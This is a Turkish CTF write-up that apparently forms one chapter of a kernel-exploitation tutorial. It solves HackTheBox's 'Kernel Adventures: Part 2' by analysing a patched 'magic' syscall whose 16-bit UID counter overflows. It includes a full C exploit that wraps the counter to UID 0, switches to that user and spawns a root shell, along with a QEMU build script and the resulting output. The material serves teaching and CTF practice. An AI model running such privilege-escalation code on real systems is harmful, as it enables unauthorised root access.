# Hedefimiz
İlk pratiğimiz olarak HackTheBox platformundaki [Kernel Adventures: Part 2](https://app.hackthebox.com/challenges/Kernel%2520Adventures%253A%2520Part%25202)'yi
tamamlayacağız. Neden Part 1'den başlamadığımı merak ederseniz, maalesef bu bölüm sadece VIP kullanıcıları tarafından erilebilir.

Ama merak etmeyin bu challenge giriş düzeyi için tam olarak aradığımız şey. Amacımız oldukça basit, bize verilen makinede root almak.

# Kaynak Analizi
Bize verilen dosyalara bakalım:
- `bzImage`: Bu inşa edilmiş Linux kernel'i. Derleme sırasında oluşturulan `vmlinux`, statik ELF binary'si, `vmlinuz` bu binary'nin sıkıştırılmış
versiyonu, ve `bzImage` bu binary'nin boot edilebilir bir versiyonu.
- `dist.cpio.gz`: Bu sıkıştırılmış, initramdisk/initramfs dosya sistemi.
- `run.sh`: CTF'i yapan kişinin kolaylık olması açısından eklediği bir QEMU başlangıç script'i.
- `README.md`: Yine CTF'i yapan kişinin kolaylık olması adına eklediği kernel'i patchleyip derleme komutlarını içeren bir README dosyası.

Asıl ilgimizi çeken dosya `patch.diff`, `README.md`de de açıklandığı gibi, bu patch `bzImage`i inşa etmeden önce kernel kaynak koduna uygulanmış
olan patch. Bakalım bu patch ile neler eklenmiş:
```diff
@@ -1115,7 +1115,7 @@ export MODORDER := $(extmod_prefix)modules.order
 export MODULES_NSDEPS := $(extmod_prefix)modules.nsdeps

 ifeq ($(KBUILD_EXTMOD),)
-core-y         += kernel/ certs/ mm/ fs/ ipc/ security/ crypto/ block/
+core-y         += kernel/ certs/ mm/ fs/ ipc/ security/ crypto/ block/ magic/
```
İlk olarak kerneli derlemek için kullanılan, inşa komutlarını içeren `Makefile` dosyasına yeni bir dizin eklenmiş. Yani yeni bir kayank dizini
oluşturulmuş demek.

```diff
diff --git a/arch/x86/entry/syscalls/syscall_64.tbl b/arch/x86/entry/syscalls/syscall_64.tbl
index 18b5500ea..580dc1892 100644
--- a/arch/x86/entry/syscalls/syscall_64.tbl
+++ b/arch/x86/entry/syscalls/syscall_64.tbl
@@ -370,6 +370,7 @@
 446    common  landlock_restrict_self  sys_landlock_restrict_self
 447    common  memfd_secret            sys_memfd_secret
 448    common  process_mrelease        sys_process_mrelease
+449    common  magic               sys_magic
```
64 bit sistem çağrıları tablosuna yeni bir sistem çağrısı eklenmiş: `sys_magic`.

```diff
@@ -880,8 +880,11 @@ __SYSCALL(__NR_memfd_secret, sys_memfd_secret)
 #define __NR_process_mrelease 448
 __SYSCALL(__NR_process_mrelease, sys_process_mrelease)

+#define __NR_magic 449
+__SYSCALL(__NR_magic, sys_magic)
+
 #undef __NR_syscalls
-#define __NR_syscalls 449
+#define __NR_syscalls 450
```
Bu yeni sistem çağrısının numarası `449`, güzel. Patch'in geri kalanında bu yeni "magic" sistem çağrısının implementasyonu mevcut, ancak
buraya geçmeden önce sistem çağrılarını anlasak iyi ederiz.

### Sistem çağrıları
Kernel'den userland'e geçmenin birçok yolu var, ancak userland'den kernel'e geçmenin pek bir yolu yok. Yine de bunu yapmak zorundayız çünkü
kernel bize bir şekilde, gerekli yerlerde, kernel'in bize sunduğu özellikleri kullanabilmemiz için bir arayüz sağlamalı. Bu arayüz sistem
çağrıları aracılığı ile sağlanıyor.

Sistem çağrıları basitçe kernel'e geçiş yapıp, "hey bizim için şunu yapar mısın?" dediğimiz nokta. Bunu yapmanın farklı yolları var, eskiden
özellikle 32 bit sistemlerde yaygın olan yöntem, özel bir yazılım interrupt'ı çğaırmaktan geçiyordu. Kernel bu interrupt'ın sistem çağrısı interrupt'u
olduğunu bildiğinden, interrupt'ı sistem çağrılarına ait fonksiyonları kullanmak için kullanıyordu. Klasik UNIX'de, ve Linux'da kullanılan bu interrupt
sayısı 128 (`0x80`) idi.

Ancak 64 bit sistemlerde Intel Pentium II ile beraber yeni bir yöntem geliştirdi. Sistem çağrıları için ayrı bir instruction oluşturdu. Bu instruction'lar
kullanım için kernel tarafından doğru ayarlanırsa, userland'de `SYSENTER`, ve kernel'de `SYSEXIT` instruction'ı kullanarak iki mod arasında hızlıca geçiş
yapmak mümkün oldu.

AMD ise kendi instructionlarını, `SYSCALL` ve `SYSRET`i yayınladı. Bu instruction set'lerinden,
[64 bit de her iki işlemcide de çalışanlar](https://wiki.osdev.org/SYSENTER#Compatibility_across_Intel_and_AMD) AMD'nin `SYSCALL` ile `SYSRET` çifti.
Tabi kernel'in bu instructionar'ların kullanımı için gerkeli hazırlıkları yaptığını varsayarsak.

Linux kernel'i de bu instruction'ları destekliyor. Ve biz şuan 64 bit bir kernel ile uğraştığımızdan tüm sistem çağrıları bu instructionlar aracılığı
ile çalışıyor.

Kernel hangi sistem çağrısını çağrıldığını anlamak için `rax` register'ını kullanıyor. Ve sistem çağrılarının argümanları için klasik C'nin calling convetion'ını
(`rdi`, `rsi`, `rdx`, `rcx`, ...) kullanılıyor. Bu durumda yeni eklenen `magic` sistem çağrsının numarası 449, ve 3 argüman kabul edecek şekilde tanımlanıyor:
```diff
+SYSCALL_DEFINE3(magic, MagicMode, mode, unsigned char __user*, username, unsigned char __user*, password) {
+    char username_buf[64];
+    char password_buf[64];
+    long ret;
+    if (initialized == 0) do_init();
+    spin_lock(&magic_lock);
+    switch (mode) {
+        case MAGIC_ADD:
+            if (copy_from_user(username_buf, username, sizeof(username_buf))) return -EFAULT;
+            if (copy_from_user(password_buf, password, sizeof(password_buf))) return -EFAULT;
+            ret = do_add(username_buf, password_buf);
+            goto out;
+        case MAGIC_EDIT:
+            if (copy_from_user(username_buf, username, sizeof(username_buf))) return -EFAULT;
+            if (copy_from_user(password_buf, password, sizeof(password_buf))) return -EFAULT;
+            ret = do_edit(username_buf, password_buf);
+            goto out;
+        case MAGIC_SWITCH:
+            if (copy_from_user(username_buf, username, sizeof(username_buf))) return -EFAULT;
+            // This can fail, password might not be required
+            if (copy_from_user(password_buf, password, sizeof(password_buf))) {
+                ret = do_switch(username_buf, NULL);
+            } else {
+                ret = do_switch(username_buf, password_buf);
+            }
+            goto out;
+        case MAGIC_DELETE:
+            if (copy_from_user(username_buf, username, sizeof(username_buf))) return -EFAULT;
+            ret = do_delete(username_buf);
+            goto out;
+        default:
+            ret = -EINVAL;
+            goto out;
+    }
+    out:
+    spin_unlock(&magic_lock);
+    return ret;
+}
```
Kabül ettiği ilk argüman bir dizi farklı operasyon yapmamıza izin veriyor. Sistem çağrısının kullandığı önemli bir veri yapısı bu liste:
```diff
+struct MagicUser* magic_users[MAINLIST_SIZE] = {NULL};
```
Bu listedeki her elemanın kendine ait bir dizi çocuk kullanıcısı var, linked list gibi değil, `magic_users`taki kullanıcılar için
bu list kullanım sırasında allocate ediliyor:
```diff
+struct MagicUser {
+    // The UID represented by this user
+    kuid_t uid;
+    // A pointer to a list of up to 64 pointers
+    struct MagicUser** children;
+    char username[64];
+    char password[64];
+};
```
`do_add` ile kendi kullanıcımızın bu `children` listesine ekleme yapabiliyoruz, `do_delete` ile silme yapabiliyoruz, `do_edit` ile bu listedeki
elemanların parolalarını değiştirebiliyoruz, ve en ilginci `do_switch` ile hem `magic_users` listesindeki diğer kullanıcılara, hem de kendi `children`
listemizdeki kullanıcılarımıza geçiş yapabiliyoruz. Fakat `magic_users`daki başka bir kullanıcıya geçiş yapabilmek için parolasını bilmemiz gerekiyor.

`do_init` bu sistem çağrısı ilk çalıştırıldığında çalışıyor, ve `magic_users` listesine `root` kullanıcısı için bir girdi ekliyor:
```diff
+/*
+ * Initializes the 'root' MagicUser
+ */
+void do_init() {
+    char username[64] = "root";
+    char password[64] = "password";
+    struct MagicUser* root;
+
+    spin_lock(&magic_lock);
+    root = kzalloc(sizeof(struct MagicUser), GFP_KERNEL);
+    root->uid.val = 0;
+    memcpy(root->username, username, sizeof(username));
+    memcpy(root->password, password, sizeof(password));
+    root->children = kzalloc(sizeof(struct MagicUser*) * CHILDLIST_SIZE, GFP_KERNEL);
+    magic_users[0] = root;
+    nextId = 1;
+    initialized = 1;
+    spin_unlock(&magic_lock);
+}
```
Burda root'un parolası hardcode'lanmış durumda. Ancak `do_switch` ile parolasını bilsek bile `root`a geçmemiz mümkün değil:
```diff
+    // Try and switch to a child
+    index = locate_user_by_name(me->children, CHILDLIST_SIZE, username);
+    if (index == -1) {
+        // Not a child, look for the user in the global list
+        index = locate_user_by_name(magic_users, MAINLIST_SIZE, username);
+        if (index == -1) {
+            // User doesn't exist at all
+            return -ENOENT;
+        } else if (index == 0) {
+            // Prevent logging back in as root
+            return -EPERM;
+        }
```
Fakat farketiyseniz, bizim için asıl önemli olarak şey kullanıcı ismi değil, `do_switch`ın geri kalanını okursak, nasıl iki kullanıcı
arasında geçiş yaptığımızı görebiliriz:
```diff
+    new = prepare_creds();
+    if (!new) return -ENOMEM;
+    ns = current_user_ns();
+    kuid = make_kuid(ns, child->uid.val);
+    kgid = make_kgid(ns, child->uid.val);
+    if (!uid_valid(kuid)) return -EINVAL;
+    if (!gid_valid(kgid)) return -EINVAL;
+    new->suid = new->uid = kuid;
+    new->fsuid = new->euid = kuid;
+    new->sgid = new->gid = kgid;
+    new->fsgid = new->egid = kgid;
+    return commit_creds(new);
+}
```
Kernel'de hesap yönetimi sonuçta söz konusu değil. `task_struct` yapısı ile ifade edilen her işlemin, kendisine ait bir `cred` elemanı var:
```c
struct task_struct {
    ...
	/* Effective (overridable) subjective task credentials (COW): */
	const struct cred __rcu		*cred;
```
Bu `cred` yapısı, işlemin UID ve GID değerlerini tutuyor:
```c
struct cred {
	atomic_long_t	usage;
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
    ...
```
Bu cred'lerin modifiyesi için `commit_creds()` fonksiyonu kullanılıyor. Bu fonksiyon kendisine verilen yeni cred yapısı, `current` olarak adlandırılan
anlık işleme veriyor. Ve yeni cred'ler oluşturmak için de, `prepare_creds()` fonksiyonu kullanılıyor.

Peki bu sistem çağrısı UID'leri nasıl takip ediyor? Gördüğünüz gibi `nextId` isimli bir değeri var:
```diff
+static unsigned short nextId = 0;
```
Ve `nextId` her yeni bir kullanıcı eklendiğinde, anlık değeri bu yeni kullanıcının `uid` değeri oluyor, ve bir artılıyor:
```diff
+    magic_users[mainlist_slot] = newUser;
+    me->children[child_slot] = newUser;
+    ret = (long)nextId;
+    nextId++;
```
Ve farketmediyseniz bu `nextId` `unsigned short`, yani 16 bit bir integer, maksimum tutabileceği değer `65535`. Bu demek oluyor ki,
eğer 65535'den daha fazla kullanıcı eklersek, bir **integer overfloww** durumu ortaya çıkacak, ve `nextId` 0 değerine geri dönüş yapacaktır.

Tabi aslında 65535 kullanıcı eklememiz mümkün değil, toplam 64 tane kullanıcı var, ve her birinin 64 tane `children` kullanıcısı olabiliyor:
```diff
+#define MAINLIST_SIZE 64
+#define CHILDLIST_SIZE 64
```
Fakat bir sürekli olarak `children` listesine yeni bir kullanıcı ekleyip `do_delete` ile bu kullanıcıyı hemen adrından silerek, 65535 tane
kullanıcı ekleyebiliriz.

# Exploit
Bu standart olmayan magic sistem çağrısı için bir glibc foksiyonu mevcut değil tabiki de, o yüzden `syscall()` makrosu ile kendi `magic()`
userland çağrımızı oluşturabiliriz:
```c
#include <stdint.h>
#include <string.h>

#include <fcntl.h>
#include <stdio.h>

typedef enum {
  MAGIC_ADD = 0,
  MAGIC_EDIT = 1,
  MAGIC_DELETE = 2,
  MAGIC_SWITCH = 3,
} MagicMode;


int64_t magic(MagicMode mode, char *username, char *password){
  return syscall(449, mode, username, password);
}

int main(){
  int64_t ret = 0;

  while((ret = magic(MAGIC_ADD, "fill", "fill")) < UINT16_MAX){
    if(ret < 0){
      printf("failed to add the fill user: %s\n", strerror(-ret));
      return EXIT_FAILURE;
    }

    if((ret = magic(MAGIC_DELETE, "fill", NULL)) != 0){
      printf("failed to delete the fill user: %s\n", strerror(-ret));
      return EXIT_FAILURE;
    }
  }

  if((ret = magic(MAGIC_ADD, "notroot", "notroot")) < 0){
    printf("failed to add the notroot user: %s\n", strerror(-ret));
    return EXIT_FAILURE;
  }

  if((ret = magic(MAGIC_SWITCH, "notroot", NULL)) < 0){
    printf("failed to switch to the notroot user: %s\n", strerror(-ret));
    return EXIT_FAILURE;
  }

  if(getuid() != 0){
    puts("exploit failed :(");
    return EXIT_FAILURE;
  }

  puts("exploit was successful, popping a shell");
  char *args[] = {"/bin/sh", NULL};
  execve("/bin/sh", args, NULL);

  perror("execve failed");
  return EXIT_FAILURE;
}
```
Kaynak kodundan hatırlarsanız, `do_add` yeni eklenen kullanıcının UID'sini döndürüyor:
```diff
+    ret = (long)nextId;
+    nextId++;
+    return ret;
+}
```
Bunu bildiğimizden exploit'imizdeki `while` döngüsü ile UID'yi sınıra getirene kadar artırabiliriz, sınıra geldiğimizde sıradaki kullanıcımızın UID'si 0 olacaktır.
UID'si 0 olan bu kullanıcıyı ekledikten sonra, bize ait, `children` listesinin üyesi bir kullanıcı olduğundan, `do_switch` ile doğrudan parola belirtmeden bu kullanıcıya
geçiş yapabiliriz.

Bu geçişin ardından, herşey doğru giderse, `commit_creds()` ile cred'lerimiz güncellenmiş olacaktır. Ve `getuid()` ile UID'imizi kontrol ettiğimizde root olmamız
gerekir. Bunu kontrol ettikten sonra, exploitimiz bir shell çalıştırıp kontrolü bize veriyor.

Bu exploit'i, `exploit.c` olarak kaydedikten sonra, bize verilen QEMU ortamında denemek için `run.sh` scriptini güncelledim:
```bash
#!/bin/sh -e

mkdir -p dist && pushd dist
  gzip -cd ../dist.cpio.gz | cpio -idm
  musl-gcc -static -o exploit.elf ../exploit.c
  find . | cpio --quiet -H newc -o | gzip -9 -n > ../dist_new.cpio.gz
popd

qemu-system-x86_64 \
        -kernel ./bzImage \
        -initrd ./dist_new.cpio.gz \
    -monitor /dev/null \
        -nographic -append "console=ttyS0"
```
Basitçe initramdisk'e exploit'imizi derleyip ekliyoruz. Derlemek için hem her makinede çalışacak çıktı üretebildiğinden ([cross-compiler](https://en.wikipedia.org/wiki/Cross_compiler)), hem de
daha küçük binary'ler ürretiğinden GCC derleyicisi yerine musl-gcc'yi kullanıyoruz (debian tabanlı dağıtımlarda, `musl-tools` paketini kurarak kurabilirsiniz).

Hadi exploit'i deneyelim:
```
/ $ id
uid=1 gid=1
/ $ ./exploit.elf
exploit was successful, popping a shell
/ # id
uid=0 gid=0
```
Ve ilk root expolitimiz bundan ibaret! Dilerseniz bunu HackTheBox makinesinde çalıştırıp, bayrağı da alabilirsiniz.

---
[Önceki](intro.md) | [Sonraki](end.md)
